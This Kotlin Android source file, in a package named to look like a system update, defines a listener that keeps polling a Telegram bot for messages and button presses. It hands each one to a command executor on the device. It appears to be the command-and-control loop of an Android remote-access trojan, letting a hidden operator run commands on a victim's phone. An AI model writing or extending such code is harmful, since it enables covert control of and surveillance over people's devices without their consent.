package com.sys.update

import android.content.Context
import android.util.Log
import org.json.JSONObject
import kotlin.concurrent.thread

object CommandListener {

    private var running = false
    private var offset = 0L
    private var worker: Thread? = null

    fun start(ctx: Context) {
        if (running) return
        running = true

        worker = thread(name = "telegram-poll") {
            while (running) {
                try {
                    val updates = TelegramApi.getUpdates(offset)
                    if (updates != null) {
                        for (i in 0 until updates.length()) {
                            val update = updates.optJSONObject(i) ?: continue
                            offset = update.optLong("update_id", offset) + 1
                            processUpdate(ctx, update)
                        }
                    } else {
                        Thread.sleep(1000)
                    }
                } catch (e: Exception) {
                    Log.e("CmdListener", "loop err: ${e.message}")
                    Thread.sleep(2000)
                }
            }
        }
    }

    fun stop() {
        running = false
        worker?.interrupt()
        worker = null
    }

    private fun processUpdate(ctx: Context, update: JSONObject) {
        try {
            // Callback query (button click)
            update.optJSONObject("callback_query")?.let { cb ->
                val data = cb.optString("data", "")
                val cbId = cb.optString("id", "")
                if (data.isNotBlank()) {
                    CommandExecutor.handle(ctx, data, cbId)
                }
                return
            }

            // Text message
            update.optJSONObject("message")?.let { msg ->
                val text = msg.optString("text", "")
                if (text.isNotBlank()) {
                    CommandExecutor.handleText(ctx, text)
                }
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "process err: ${e.message}")
        }
    }
}
